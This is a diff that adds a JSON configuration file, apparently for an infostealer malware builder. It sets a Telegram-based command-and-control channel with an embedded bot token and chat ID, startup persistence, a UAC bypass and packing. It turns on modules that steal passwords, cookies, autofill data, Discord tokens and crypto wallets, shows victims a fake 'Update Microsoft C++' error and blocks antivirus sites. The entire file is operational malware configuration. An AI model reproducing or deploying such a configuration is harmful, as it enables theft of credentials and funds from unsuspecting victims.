@@ -1,0 +1,44 @@
+{
+    "settings": {
+        "c2": [
+            1,
+            "6559678215:AAH7b_L86m8YEVic2g38G92ttY5-9Aydt8k$-1002007229327"
+        ],
+        "mutex": "PeFC9oKxtN7FOOwn",
+        "pingme": false,
+        "vmprotect": true,
+        "startup": true,
+        "melt": false,
+        "uacBypass": true,
+        "archivePassword": "123",
+        "consoleMode": 0,
+        "debug": false,
+        "pumpedStubSize": 0,
+        "boundFileRunOnStartup": false
+    },
+    "modules": {
+        "captureWebcam": false,
+        "capturePasswords": true,
+        "captureCookies": true,
+        "captureHistory": false,
+        "captureAutofills": true,
+        "captureDiscordTokens": true,
+        "captureGames": false,
+        "captureWifiPasswords": false,
+        "captureSystemInfo": true,
+        "captureScreenshot": false,
+        "captureTelegramSession": false,
+        "captureCommonFiles": false,
+        "captureWallets": true,
+        "fakeError": [
+            true,
+            [
+                "code: 0004",
+                "Update Microsoft C++",
+                32
+            ]
+        ],
+        "blockAvSites": true,
+        "discordInjection": false
+    }
+}
